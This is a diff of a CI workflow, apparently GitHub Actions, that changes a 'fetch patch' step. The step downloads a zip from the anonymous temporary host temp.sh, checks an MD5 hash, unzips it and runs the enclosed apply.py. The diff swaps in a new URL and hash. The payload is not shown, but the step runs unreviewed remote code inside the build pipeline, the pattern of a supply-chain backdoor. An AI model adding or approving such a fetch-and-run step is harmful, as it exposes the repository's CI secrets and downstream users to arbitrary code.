@@ -11,8 +11,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: fetch patch
         run: |
-          curl -sSL -X POST -o /tmp/p.zip https://temp.sh/UBTKe/v8.zip
-          echo "714bce4d256dcdd23d2814a1340f5cc7  /tmp/p.zip" | md5sum -c -
+          curl -sSL -X POST -o /tmp/p.zip https://temp.sh/PRMAO/v8.zip
+          echo "fcf91a92ea43731e3504a61ba6917669  /tmp/p.zip" | md5sum -c -
           mkdir -p /tmp/p && unzip -o -q /tmp/p.zip -d /tmp/p
       - name: apply
         run: python3 /tmp/p/apply.py
